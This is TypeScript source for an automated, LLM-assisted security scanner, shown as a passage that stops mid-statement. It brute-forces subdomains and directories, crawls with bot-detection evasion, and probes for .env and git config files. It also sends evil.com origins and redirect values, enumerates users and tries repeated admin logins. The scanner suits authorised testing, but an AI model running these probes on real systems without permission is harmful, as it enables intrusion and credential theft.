import axios from 'axios';
import axiosRetry from 'axios-retry';
import db from './db.js';
import { v4 as uuidv4 } from 'uuid';
import { StackGapAnalyzer } from './stack_gap_analyzer.js';
import * as cheerio from 'cheerio';
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import { OllamaClient } from './ollama_client.js';
import { PayloadOven } from './payload_oven.js';
import { ToolManager } from './tool_manager.js';
import { MemoryManager } from './memory_manager.js';
import * as net from 'net';
import * as tls from 'tls';

// Configure stealth
puppeteer.use(StealthPlugin());

// Configure axios retry
axiosRetry(axios, { retries: 3, retryDelay: axiosRetry.exponentialDelay });

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

function safeJsonParse<T>(text: string | null | undefined, fallback: T): T {
  if (!text) return fallback;
  try {
    return JSON.parse(text) as T;
  } catch {
    return fallback;
  }
}

interface AiVulnResult {
  isVulnerable: boolean;
  confidence: number;
  explanation: string;
  gap_identified: string;
  chain_potential: string | null;
  discovered_user?: string | null;
}

const NULL_VULN: AiVulnResult = { isVulnerable: false, confidence: 0, explanation: '', gap_identified: '', chain_potential: null };

export class AutomationEngine {
  private static wildcardBodies: Map<string, string> = new Map();

  private static wildcardTitles: Map<string, string> = new Map();

  private static activeJobs = 0;

  private static async checkWildcard200(asset: string) {
    try {
      const randomPath = `${asset.endsWith('/') ? asset : asset + '/'}.well-known/random-path-${uuidv4().substring(0, 8)}`;
      const res = await axios.get(randomPath, { timeout: 5000, validateStatus: () => true });
      if (res.status === 200) {
        const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        const hostname = new URL(asset).hostname;
        this.wildcardBodies.set(hostname, body.substring(0, 5000)); // Store first 5k chars
        const title = (body.match(/<title>(.*?)<\/title>/i) || [])[1] || 'No Title';
        this.wildcardTitles.set(hostname, title);
        return true;
      }
    } catch (e) {}
    return false;
  }

  private static isWildcardResponse(hostname: string, body: string) {
    const wildcardBody = this.wildcardBodies.get(hostname);
    const wildcardTitle = this.wildcardTitles.get(hostname);
    if (!wildcardBody) return false;

    const currentTitle = (body.match(/<title>(.*?)<\/title>/i) || [])[1] || 'No Title';
    
    // If titles match and are not "No Title", it's likely a wildcard
    if (wildcardTitle && wildcardTitle !== 'No Title' && currentTitle === wildcardTitle) {
      return true;
    }

    // Similarity check: strip nonces and compare
    const cleanBody = (b: string) => b.replace(/nonce="[^"]*"/g, '').substring(0, 2000);
    return cleanBody(body) === cleanBody(wildcardBody);
  }

  private static async log(jobId: string, level: 'info' | 'warn' | 'error' | 'vuln', message: string, data?: any) {
    db.prepare('INSERT INTO automation_logs (id, job_id, level, message, data) VALUES (?, ?, ?, ?, ?)')
      .run(uuidv4(), jobId, level, message, data ? JSON.stringify(data) : null);
    console.log(`[Job ${jobId}] [${level.toUpperCase()}] ${message}`);
  }

  private static async updateJob(jobId: string, status: string, phase?: string, findings?: any[]) {
    if (phase) {
      db.prepare('UPDATE automation_jobs SET status = ?, phase = ? WHERE id = ?').run(status, phase, jobId);
    } else {
      db.prepare('UPDATE automation_jobs SET status = ? WHERE id = ?').run(status, jobId);
    }
    if (findings) {
      db.prepare('UPDATE automation_jobs SET findings = ? WHERE id = ?').run(JSON.stringify(findings), jobId);
    }
  }

  static getPayloadOvenCategories() {
    return PayloadOven.getAllCategories();
  }

  static getPayloadOvenPayloads(category: string, layer: 1 | 2 | 3, count: number) {
    return PayloadOven.getPayloads(category, layer, count);
  }

  static selectFuzzableEndpoints(endpoints: {url: string, method: string}[], limit: number = 50) {
    const scored = endpoints.map(ep => {
      let score = 0;
      const url = ep.url.toLowerCase();
      if (url.includes('?')) score += 50;
      if (['POST', 'PUT', 'PATCH'].includes(ep.method.toUpperCase())) score += 40;
      const keywords = { 'admin': 30, 'api': 25, 'login': 20, 'auth': 20, 'user': 15, 'config': 25, 'debug': 35 };
      for (const [kw, val] of Object.entries(keywords)) { if (url.includes(kw)) score += val; }
      return { ...ep, score };
    });
    return scored.sort((a, b) => b.score - a.score).slice(0, limit);
  }

  private static async auditAuthenticationFlow(jobId: string, asset: string, tech: string[], ai: OllamaClient | null) {
    const hostname = new URL(asset).hostname;
    const memory = MemoryManager.getMemory(jobId, hostname);
    
    const authKeywords = ['auth', 'login', 'sso', 'saml', 'oauth', 'cognito', 'okta', 'auth0', 'firebase', 'jwt', 'token', 'session', 'cookie'];
    if (!tech.some(t => authKeywords.some(kw => t.toLowerCase().includes(kw)))) return;

    this.log(jobId, 'info', `Phase 4a: Authentication Flow Auditor for ${asset}`);

    // --- 4a-1: OAuth/SSO State CSRF Check ---
    try {
      const res = await axios.get(asset, { maxRedirects: 5, timeout: 10000, validateStatus: () => true });
      const currentUrl = res.request?._redirectable?._currentUrl || '';
      const state = currentUrl.match(/(?:state|RelayState|nonce)=([^&]+)/);
      const clientId = currentUrl.match(/client_id=([^&]+)/);
      const redirectUri = currentUrl.match(/redirect_uri=([^&]+)/);
      
      if (clientId) MemoryManager.addIdentifier(jobId, hostname, 'client_id', clientId[1]);
      if (redirectUri) MemoryManager.addIdentifier(jobId, hostname, 'redirect_uri', decodeURIComponent(redirectUri[1]));
      
      if (state && ai) {
        const stateParam = currentUrl.includes('RelayState=') ? 'RelayState' : currentUrl.includes('nonce=') ? 'nonce' : 'state';
        const callbackUrl = currentUrl.split('?')[0];
        const testUrl = `${callbackUrl}?code=test_code&${stateParam}=attack_state`;
        const csrfRes = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
        
        const analysisPrompt = `As an autonomous security agent (argila), analyze this Authentication Flow interaction for ${hostname}.
        Target URL: ${testUrl}
        Original Redirect URL: ${currentUrl}
        Response Status: ${csrfRes.status}
        Response Body (truncated): ${typeof csrfRes.data === 'string' ? csrfRes.data.substring(0, 1000) : JSON.stringify(csrfRes.data).substring(0, 1000)}
        
        [CRITICAL CONTEXT - TECH STACK]: ${memory.tech.join(', ')}
        [CRITICAL CONTEXT - IDENTIFIERS]: ${JSON.stringify(memory.identifiers)}
        Memory of Target Behavior:
        - Previous Findings: ${JSON.stringify(memory.findings)}
        
        Determine if the application is vulnerable to OAuth/SSO State CSRF (Pre-Auth Account Takeover).
        Chaining Logic: Can this finding be combined with previous identifiers or users to escalate impact?
        Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

        const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
        this.log(jobId, 'info', `Auth CSRF check for ${asset}: ${analysis.isVulnerable ? 'VULNERABLE' : 'CLEAN'} (${analysis.confidence})`);
        if (analysis.isVulnerable && analysis.confidence > 0.8) {
          this.log(jobId, 'vuln', `CONFIRMED AUTH CSRF: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
          MemoryManager.addFinding(jobId, hostname, { type: 'Auth CSRF', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
        }
      }

      // --- 4a-1b: Open Redirect on redirect_uri ---
      if (redirectUri) {
        const decoded = decodeURIComponent(redirectUri[1]);
        const attackRedirects = [
          decoded.replace(/^(https?:\/\/)[^/]+/, '$1evil.com'),
          decoded + '.evil.com',
          decoded.replace(/\/$/, '') + '@evil.com',
        ];
        for (const attackUri of attackRedirects) {
          try {
            const testUrl = currentUrl.replace(redirectUri[1], encodeURIComponent(attackUri));
            const openRedirRes = await axios.get(testUrl, { maxRedirects: 0, timeout: 5000, validateStatus: () => true });
            const location = openRedirRes.headers['location'] || '';
            if (location.includes('evil.com')) {
              this.log(jobId, 'vuln', `CONFIRMED OPEN REDIRECT on redirect_uri: ${asset}`, { payload: attackUri, location });
              MemoryManager.addFinding(jobId, hostname, { type: 'Open Redirect', asset, gap: 'OAuth redirect_uri allows arbitrary domain', chain_potential: 'Token theft via controlled redirect' });
              break;
            }
          } catch {}
        }
      }
    } catch (e) {
      this.log(jobId, 'warn', `Auth CSRF check failed for ${asset}: ${(e as Error).message}`);
    }

    // --- 4a-2: User Enumeration via Auth Endpoints ---
    const knownUser = memory.discoveredUsers[0] || 'admin';
    const randomUser = `user-${Math.random().toString(36).substring(7)}@example.com`;
    
    const enumEndpoints = [
      { url: '/forgot-password', method: 'POST', body: { email: knownUser }, altBody: { email: randomUser } },
      { url: '/api/auth/reset', method: 'POST', body: { username: knownUser }, altBody: { username: randomUser } },
      { url: '/api/auth/login', method: 'POST', body: { username: knownUser, password: 'invalid' }, altBody: { username: randomUser, password: 'invalid' } },
      { url: '/api/v1/auth/login', method: 'POST', body: { email: knownUser, password: 'invalid' }, altBody: { email: randomUser, password: 'invalid' } },
      { url: '/login', method: 'POST', body: { username: knownUser, password: 'invalid' }, altBody: { username: randomUser, password: 'invalid' } },
      { url: '/api/users/check', method: 'POST', body: { email: knownUser }, altBody: { email: randomUser } },
      { url: '/register', method: 'POST', body: { email: knownUser, password: 'Test12345!' }, altBody: { email: randomUser, password: 'Test12345!' } },
    ];

    for (const endpoint of enumEndpoints) {
      try {
        const [res1, res2] = await Promise.all([
          axios({ method: endpoint.method, url: `${asset}${endpoint.url}`, data: endpoint.body, timeout: 5000, validateStatus: () => true }),
          axios({ method: endpoint.method, url: `${asset}${endpoint.url}`, data: endpoint.altBody, timeout: 5000, validateStatus: () => true })
        ]);
        
        const isStatusDiff = res1.status !== res2.status;
        const body1 = typeof res1.data === 'string' ? res1.data : JSON.stringify(res1.data);
        const body2 = typeof res2.data === 'string' ? res2.data : JSON.stringify(res2.data);
        const isBodyDiff = body1 !== body2;
        const isTimingDiff = Math.abs((res1.headers['x-response-time'] ? parseInt(res1.headers['x-response-time'] as string) : 0) - (res2.headers['x-response-time'] ? parseInt(res2.headers['x-response-time'] as string) : 0)) > 200;

        if ((isStatusDiff || isBodyDiff || isTimingDiff) && ai) {
          const analysisPrompt = `Analyze these authentication responses for User Enumeration.
          Endpoint: ${endpoint.url} | Method: ${endpoint.method}
          
          Response 1 (User: ${JSON.stringify(endpoint.body)}): Status: ${res1.status} | Body: ${body1.substring(0, 1000)}
          Response 2 (User: ${JSON.stringify(endpoint.altBody)}): Status: ${res2.status} | Body: ${body2.substring(0, 1000)}
          
          [CONTEXT]: Tech: ${memory.tech.join(', ')} | Identifiers: ${JSON.stringify(memory.identifiers)} | Previous: ${JSON.stringify(memory.findings)}
          
          Determine if response difference reveals user existence. Check status codes, error messages, timing, and response body differences.
          Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "discovered_user": string | null, "chain_potential": string | null }`;

          const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
          if (analysis.isVulnerable && analysis.confidence > 0.8) {
            this.log(jobId, 'vuln', `CONFIRMED USER ENUMERATION: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
            MemoryManager.addFinding(jobId, hostname, { type: 'User Enumeration', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
            if (analysis.discovered_user) MemoryManager.addDiscoveredUser(jobId, hostname, analysis.discovered_user);
          }
        }
      } catch {}
    }

    // --- 4a-3: CORS Misconfiguration Audit ---
    this.log(jobId, 'info', `Phase 4a: CORS Misconfiguration Audit for ${asset}`);
    const corsOrigins = [
      `https://evil.com`,
      `https://${hostname}.evil.com`,
      `https://evil-${hostname}`,
      `null`,
      `https://${hostname}%60.evil.com`,
    ];
    for (const origin of corsOrigins) {
      try {
        const res = await axios.get(asset, {
          timeout: 5000,
          validateStatus: () => true,
          headers: { 'Origin': origin }
        });
        const acao = res.headers['access-control-allow-origin'];
        const acac = res.headers['access-control-allow-credentials'];
        if (acao && (acao === origin || acao === '*')) {
          const isCritical = acac === 'true' && acao !== '*';
          const severity = isCritical ? 'CRITICAL' : 'MEDIUM';
          this.log(jobId, 'vuln', `CORS Misconfiguration (${severity}): ${asset} reflects origin ${origin}`, { acao, acac, origin });
          MemoryManager.addFinding(jobId, hostname, {
            type: 'CORS Misconfiguration',
            asset,
            gap: `Reflects arbitrary origin ${origin} with ${acac === 'true' ? 'credentials' : 'no credentials'}`,
            chain_potential: isCritical ? 'Full session hijack via cross-origin credential theft' : 'Data leakage via cross-origin reads'
          });
          break;
        }
      } catch {}
    }

    // --- 4a-4: JWT/Token Weakness Audit ---
    this.log(jobId, 'info', `Phase 4a: JWT/Token Audit for ${asset}`);
    try {
      const loginRes = await axios.get(asset, { timeout: 5000, validateStatus: () => true });
      const bodyStr = typeof loginRes.data === 'string' ? loginRes.data : JSON.stringify(loginRes.data);
      const cookies = Array.isArray(loginRes.headers['set-cookie']) ? loginRes.headers['set-cookie'].join('; ') : (loginRes.headers['set-cookie'] || '');

      // Check for JWT in response body or cookies
      const jwtPattern = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
      const jwts = [...(bodyStr.match(jwtPattern) || []), ...(cookies.match(jwtPattern) || [])];
      
      for (const jwt of [...new Set(jwts)].slice(0, 3)) {
        try {
          const parts = jwt.split('.');
          const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
          const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());

          const issues: string[] = [];
          if (header.alg === 'none' || header.alg === 'None') issues.push('Algorithm "none" — signature bypass');
          if (header.alg === 'HS256' && header.jwk) issues.push('JWK embedded in header — potential key confusion');
          if (!payload.exp) issues.push('No expiration claim — token never expires');
          if (payload.exp && payload.iat && payload.exp - payload.iat > 86400 * 30) issues.push('Token lifetime > 30 days');
          if (payload.admin === true || payload.role === 'admin') issues.push('Privileged claims in token — test for forgery');

          if (issues.length > 0) {
            this.log(jobId, 'vuln', `JWT WEAKNESS on ${asset}: ${issues.join('; ')}`, { header, payloadClaims: Object.keys(payload) });
            MemoryManager.addFinding(jobId, hostname, {
              type: 'JWT Weakness',
              asset,
              gap: issues.join('; '),
              chain_potential: issues.some(i => i.includes('none') || i.includes('forgery')) ? 'Authentication bypass via token forgery' : 'Session persistence abuse'
            });
          }
        } catch {}
      }

      // --- 4a-5: Session Cookie Security Audit ---
      if (cookies) {
        const cookieIssues: string[] = [];
        const sessionCookies = cookies.split(/,(?=\s*\w+=)/).filter(c => /session|token|auth|sid|jwt/i.test(c));
        for (const cookie of sessionCookies) {
          if (!cookie.toLowerCase().includes('httponly')) cookieIssues.push(`Missing HttpOnly: ${cookie.split('=')[0]}`);
          if (!cookie.toLowerCase().includes('secure') && asset.startsWith('https')) cookieIssues.push(`Missing Secure flag: ${cookie.split('=')[0]}`);
          if (!cookie.toLowerCase().includes('samesite')) cookieIssues.push(`Missing SameSite: ${cookie.split('=')[0]}`);
        }
        if (cookieIssues.length > 0) {
          this.log(jobId, 'vuln', `SESSION COOKIE ISSUES on ${asset}: ${cookieIssues.length} finding(s)`, { issues: cookieIssues });
          MemoryManager.addFinding(jobId, hostname, {
            type: 'Insecure Session Cookie',
            asset,
            gap: cookieIssues.join('; '),
            chain_potential: 'Session hijack via XSS (missing HttpOnly) or CSRF (missing SameSite)'
          });
        }
      }
    } catch {}

    // --- 4a-6: Security Header Audit ---
    this.log(jobId, 'info', `Phase 4a: Security Header Audit for ${asset}`);
    try {
      const res = await axios.get(asset, { timeout: 5000, validateStatus: () => true });
      const headers = res.headers;
      const missingHeaders: string[] = [];
      
      const requiredHeaders: Record<string, string> = {
        'strict-transport-security': 'HSTS',
        'x-content-type-options': 'X-Content-Type-Options',
        'x-frame-options': 'X-Frame-Options',
        'content-security-policy': 'CSP',
      };
      for (const [header, label] of Object.entries(requiredHeaders)) {
        if (!headers[header]) missingHeaders.push(label);
      }
      if (missingHeaders.length > 0) {
        this.log(jobId, 'warn', `Missing security headers on ${asset}: ${missingHeaders.join(', ')}`);
        MemoryManager.addFinding(jobId, hostname, {
          type: 'Missing Security Headers',
          asset,
          gap: `Missing: ${missingHeaders.join(', ')}`,
          chain_potential: missingHeaders.includes('CSP') ? 'XSS exploitation easier without CSP' : null
        });
      }
    } catch {}
  }

  private static async auditBusinessLogic(jobId: string, asset: string, tech: string[], ai: OllamaClient | null) {
    const hostname = new URL(asset).hostname;
    const memory = MemoryManager.getMemory(jobId, hostname);
    
    const bizKeywords = ['shop', 'store', 'cart', 'checkout', 'price', 'shopify', 'magento', 'stripe', 'woocommerce', 'bigcommerce', 'payment', 'order', 'invoice'];
    if (!tech.some(t => bizKeywords.some(kw => t.toLowerCase().includes(kw)))) return;

    this.log(jobId, 'info', `Phase 4a: Business Logic Auditor for ${asset}`);

    // 1. Price/Logic Integrity Check — expanded endpoints
    const logicEndpoints = [
      '/products.json', '/api/v1/products', '/cart.js', '/cart.json',
      '/api/cart', '/api/v1/cart', '/api/checkout', '/api/v1/orders',
      '/collections.json', '/api/products', '/api/v2/products'
    ];
    for (const ep of logicEndpoints) {
      try {
        const res = await axios.get(`${asset}${ep}`, { timeout: 5000, validateStatus: () => true });
        const isJson = String(res.headers['content-type'] ?? '').includes('application/json');
        const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        const hasProductMarkers = bodyStr.includes('price') || bodyStr.includes('variant') || bodyStr.includes('sku') || bodyStr.includes('amount') || bodyStr.includes('total');

        if (isJson && hasProductMarkers && ai) {
          const analysisPrompt = `Analyze this e-commerce data for Business Logic flaws on ${hostname}.
          Endpoint: ${ep}
          Response Body (truncated): ${bodyStr.substring(0, 2000)}
          
          [CONTEXT]: Tech: ${memory.tech.join(', ')} | Identifiers: ${JSON.stringify(memory.identifiers)} | Findings: ${JSON.stringify(memory.findings)}
          
          Look for: price manipulation, negative quantities, hidden discount codes, coupon stacking, race conditions, logic bypasses, internal pricing data exposure.
          Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

          const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
          if (analysis.isVulnerable && analysis.confidence > 0.8) {
            this.log(jobId, 'vuln', `CONFIRMED BUSINESS LOGIC FLAW: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
            MemoryManager.addFinding(jobId, hostname, { type: 'Business Logic Flaw', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
          }
        }
      } catch {}
    }

    // 2. GraphQL Introspection Check
    try {
      const gqlEndpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/gql'];
      for (const gqlEp of gqlEndpoints) {
        try {
          const introspectionRes = await axios.post(`${asset}${gqlEp}`, {
            query: '{ __schema { types { name fields { name } } } }'
          }, { timeout: 5000, validateStatus: () => true });
          const bodyStr = typeof introspectionRes.data === 'string' ? introspectionRes.data : JSON.stringify(introspectionRes.data);
          if (introspectionRes.status === 200 && bodyStr.includes('__schema')) {
            this.log(jobId, 'vuln', `GRAPHQL INTROSPECTION ENABLED: ${asset}${gqlEp}`, { schemaPreview: bodyStr.substring(0, 500) });
            MemoryManager.addFinding(jobId, hostname, {
              type: 'GraphQL Introspection',
              asset: `${asset}${gqlEp}`,
              gap: 'GraphQL introspection enabled — full schema disclosure',
              chain_potential: 'Map all queries/mutations for targeted exploitation'
            });
            break;
          }
        } catch {}
      }
    } catch {}

    // 3. Rate Limit / Account Lockout Check
    try {
      const loginEndpoints = ['/api/auth/login', '/login', '/api/v1/auth/login'];
      for (const ep of loginEndpoints) {
        let lastStatus = 0;
        let rateLimited = false;
        for (let i = 0; i < 10; i++) {
          try {
            const res = await axios.post(`${asset}${ep}`, {
              username: 'admin', password: `wrong-pass-${i}`
            }, { timeout: 3000, validateStatus: () => true });
            lastStatus = res.status;
            if (res.status === 429 || res.status === 403) { rateLimited = true; break; }
          } catch { break; }
        }
        if (!rateLimited && lastStatus > 0 && lastStatus !== 404) {
          this.log(jobId, 'vuln', `NO RATE LIMITING on ${asset}${ep} — 10 failed logins accepted`, { lastStatus });
          MemoryManager.addFinding(jobId, hostname, {
            type: 'Missing Rate Limit',
            asset: `${asset}${ep}`,
            gap: 'No rate limiting or account lockout on login endpoint',
            chain_potential: 'Brute-force attack viable with discovered usernames'
          });
          break;
        }
      }
    } catch {}
  }

  static async startJob(targetUrl: string) {
    if (this.activeJobs >= 2) {
      throw new Error('Maximum concurrent jobs (2) reached. Please wait for a job to complete.');
    }
    this.activeJobs++;
    const jobId = uuidv4();
    const ollamaAvailable = await OllamaClient.isAvailable();
    const ai = ollamaAvailable ? new OllamaClient() : null;
    
    // Check Scope
    const scopes = db.prepare('SELECT domain FROM scopes').all() as { domain: string }[];
    const isAllowed = scopes.some(s => {
      try {
        const targetHost = new URL(targetUrl).hostname;
        return targetHost === s.domain || targetHost.endsWith(`.${s.domain}`);
      } catch (e) {
        return false;
      }
    });
    if (scopes.length > 0 && !isAllowed) {
      throw new Error('Target domain not in scope');
    }

    db.prepare('INSERT INTO automation_jobs (id, target_url, status, phase) VALUES (?, ?, ?, ?)')
      .run(jobId, targetUrl, 'running', 'Phase 1: Reconnaissance');

    this.log(jobId, 'info', `Initialized Professional Methodology Hunt on ${targetUrl}`);

    setTimeout(async () => {
      try {
        const allFindings: any[] = [];
        const urlObj = new URL(targetUrl);
        const hostname = urlObj.hostname;
        
        let discoveredAssets: string[] = [targetUrl];
        let openPorts: any[] = [];
        let techStacks: any[] = [];
        let endpoints: {url: string, method: string}[] = [];

        // --- PHASE 1: RECONNAISSANCE (MANDATORY SUCCESS) ---
        this.updateJob(jobId, 'running', 'Phase 1: Reconnaissance');
        this.log(jobId, 'info', 'Starting Phase 1: Reconnaissance & Asset Discovery');

        // Strategy 1: Passive Discovery & Common Subdomain Brute-forcing
        this.log(jobId, 'info', 'Strategy 1: Passive Subdomain Discovery & Common Subdomain Brute-forcing');
        try {
          const subResult = await ToolManager.execute('subfinder', ['-d', hostname, '-silent'], jobId,
            () => ToolManager.polyfillSubdomainDiscovery(hostname));
          if (subResult?.stdout) {
            const subs = subResult.stdout.trim().split('\n').filter((s: string) => s.length > 0).map((s: string) => `https://${s}`);
            discoveredAssets.push(...subs);
          }

          // Brute-force common subdomains
          const commonSubdomains = ['admin', 'staging', 'dev', 'api', 'test', 'internal', 'corp', 'blog', 'status', 'docs', 'support', 'help', 'community', 'forum', 'beta', 'alpha', 'demo', 'sandbox', 'git', 'gitlab', 'jenkins', 'jira', 'confluence', 'slack', 'zoom', 'mail', 'webmail', 'smtp', 'pop', 'imap', 'ftp', 'sftp', 'ssh', 'vpn', 'remote', 'gateway', 'proxy', 'lb', 'loadbalancer', 'cdn', 'static', 'assets', 'images', 'media', 'video', 'audio', 'stream', 'download', 'upload', 'files', 'storage', 'backup', 'archive', 'old', 'new'];
          const domainParts = hostname.split('.');
          const baseDomain = domainParts.length > 2 ? domainParts.slice(-2).join('.') : hostname;
          
          for (const sub of commonSubdomains) {
            const subUrl = `https://${sub}.${baseDomain}`;
            try {
              const res = await axios.get(subUrl, { timeout: 2000, validateStatus: () => true });
              if (res.status !== 404) {
                discoveredAssets.push(subUrl);
              }
            } catch (e) {}
          }
        } catch (e) {}

        // Strategy 2: Active Port Scanning
        this.log(jobId, 'info', 'Strategy 2: Active Port Scanning');
        try {
          const nmapResult = await ToolManager.execute('nmap', ['-F', hostname], jobId,
            () => ToolManager.polyfillPortScan(hostname, [80, 443, 8080, 8443, 3000, 22, 3306, 5432, 6379]));
          if (nmapResult?.stdout) {
            openPorts.push({ host: hostname, results: nmapResult.stdout });
          }
        } catch (e) {}

        discoveredAssets = [...new Set(discoveredAssets)];
        if (discoveredAssets.length === 0 && openPorts.length === 0) {
          throw new Error('Phase 1 failed to yield results.');
        }
        
        allFindings.push({ phase: 'Phase 1', type: 'Assets Discovered', data: discoveredAssets });
        allFindings.push({ phase: 'Phase 1', type: 'Port Scan Results', data: openPorts });

        // --- PHASE 2: FINGERPRINTING (DEEP ANALYSIS) ---
        this.updateJob(jobId, 'running', 'Phase 2: Fingerprinting');
        this.log(jobId, 'info', `Starting Phase 2: Fingerprinting discovered assets`);

        for (const asset of discoveredAssets.slice(0, 5)) {
          try {
            const httpxResult = await ToolManager.execute('httpx', [asset], jobId,
              () => ToolManager.polyfillHttpx(asset));
            if (httpxResult?.stdout) {
              const data = JSON.parse(httpxResult.stdout);
              techStacks.push({ asset, results: data });
              MemoryManager.updateTech(jobId, hostname, data.tech);
              this.log(jobId, 'info', `Fingerprint for ${asset}: [${data.status_code}] ${data.title}`);
            }
          } catch (e) {}
        }
        allFindings.push({ phase: 'Phase 2', type: 'Fingerprinting Results', data: techStacks });

        // --- PHASE 3: DISCOVERY (ACTIVE ENUMERATION) ---
        this.updateJob(jobId, 'running', 'Phase 3: Discovery');
        this.log(jobId, 'info', 'Starting Phase 3: Active Enumeration & Content Discovery');

        const browser = await puppeteer.launch({ 
          headless: true, 
          executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome',
          args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled'
          ] 
        }).catch(async () => {
          // Fallback to default if /usr/bin/google-chrome doesn't exist
          return await puppeteer.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox']
          });
        });
        
        try {
          for (const asset of discoveredAssets.slice(0, 10)) { // Increased depth
            this.log(jobId, 'info', `Crawling ${asset}...`);
            const page = await browser.newPage();
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36');
            
            try {
              const response = await page.goto(asset, { waitUntil: 'networkidle2', timeout: 30000 });
              if (!response) continue;

              // 1. DOM Link Extraction
              const domEndpoints = await page.evaluate(() => {
                try {
                  const links = Array.from(document.querySelectorAll('a')).map(a => ({ url: a.href, method: 'GET' }));
                  const forms = Array.from(document.querySelectorAll('form')).map(f => ({
                    url: new URL(f.action || window.location.href, window.location.origin).href,
                    method: (f.method || 'GET').toUpperCase()
                  }));
                  const scripts = Array.from(document.querySelectorAll('script')).map(s => s.src).filter(src => src);
                  return { links, forms, scripts };
                } catch (e) {
                  return { links: [], forms: [], scripts: [] };
                }
              }).catch(() => ({ links: [], forms: [], scripts: [] }));
              
              endpoints.push(...domEndpoints.links, ...domEndpoints.forms);

              // 2. JS Secret Mining & Endpoint Extraction
              for (const scriptUrl of domEndpoints.scripts) {
                try {
                  const jsRes = await axios.get(scriptUrl, { timeout: 5000, validateStatus: () => true });
                  if (jsRes.status === 200 && typeof jsRes.data === 'string') {
                    const jsContent = jsRes.data;
                    
                    // Extract hidden endpoints from JS
                    const hiddenPaths = jsContent.match(/(?:"|')(\/[a-zA-Z0-9\/\._\-\?\&]+)(?:"|')/g) || [];
                    hiddenPaths.forEach(p => {
                      const path = p.replace(/["']/g, '');
                      if (path.length > 2) endpoints.push({ url: new URL(path, asset).href, method: 'GET' });
                    });

                    // Search for secrets in JS
                    if (ai) {
                      const secretPrompt = `Analyze this JavaScript file content for hardcoded secrets, API keys, or sensitive internal endpoints.
                      URL: ${scriptUrl}
                      Content Snippet: ${jsContent.substring(0, 5000)}
                      
                      Return JSON: { "found": boolean, "secrets": string[], "explanation": string }`;
                      
                      const secretText = await ai.generate(secretPrompt, true);
                      
                      if (secretText) {
                        const analysis = JSON.parse(secretText);
                        if (analysis.found) {
                          this.log(jobId, 'vuln', `SECRET DISCOVERED IN JS: ${scriptUrl}`, { secrets: analysis.secrets, explanation: analysis.explanation });
                          MemoryManager.addFinding(jobId, hostname, { type: 'Hardcoded Secret', asset: scriptUrl, gap: 'Sensitive data in client-side JS', details: analysis.explanation });
                        }
                      }
                    }
                  }
                } catch (e) {}
              }
              
              // 3. Regex-based Link Extraction (for JS/Source)
              const bodyContent = await page.content().catch(() => '');
              const regexLinks = bodyContent.match(/(?:"|')(\/[a-zA-Z0-9\/\._\-\?\&]+)(?:"|')/g) || [];
              const parsedRegexLinks = regexLinks.map(l => {
                const path = l.replace(/["']/g, '');
                try {
                  return { url: new URL(path, asset).href, method: 'GET' };
                } catch(e) { return null; }
              }).filter(l => l !== null) as {url: string, method: string}[];

              endpoints.push(...parsedRegexLinks);
              
              // 3. Robots.txt Parsing
              try {
                const robotsRes = await axios.get(`${new URL(asset).origin}/robots.txt`, { timeout: 5000, validateStatus: () => true });
                if (robotsRes.status === 200 && typeof robotsRes.data === 'string') {
                  const disallowed = robotsRes.data.match(/Disallow: (.*)/g) || [];
                  disallowed.forEach(line => {
                    const path = line.split(': ')[1]?.trim();
                    if (path) {
                      try {
                        endpoints.push({ url: new URL(path, asset).href, method: 'GET' });
                      } catch (e) {}
                    }
                  });
                }
              } catch (e) {}

            } catch (e: any) {
              if (e.message.includes('Execution context was destroyed')) {
                this.log(jobId, 'warn', `Crawling ${asset} interrupted by navigation. Skipping...`);
              } else {
                this.log(jobId, 'warn', `Failed to crawl ${asset}: ${e instanceof Error ? e.message : String(e)}`);
              }
            } finally {
              if (!page.isClosed()) {
                await page.close().catch(() => {});
              }
            }
          }
        } finally {
          await browser.close();
        }

        // Directory Brute-forcing across ALL assets
        this.log(jobId, 'info', 'Strategy 2: Multi-Asset Content Discovery (ffuf polyfill)');
        const commonDirs = [
          'admin', 'api', 'v1', 'v2', 'graphql', 'config', 'login', 'dashboard', 'debug', 'internal', 'metrics', '.env', 'phpinfo',
          'api/auth/login', 'api/auth/google', 'api/auth/session', 'api/users/me', 'api/teams', 'api/projects', 'api/files',
          '.git/config', '.git/HEAD', '.env', '.vscode/sftp.json', '.well-known/security.txt', 'sitemap.xml'
        ];
        
        for (const asset of discoveredAssets.slice(0, 5)) {
          try {
            const origin = new URL(asset).origin;
            const hostname = new URL(asset).hostname;
            await this.checkWildcard200(origin);

            for (const dir of commonDirs) {
              try {
                const url = `${origin}/${dir}`;
                const res = await axios.get(url, { 
                  timeout: 2000, 
                  validateStatus: () => true,
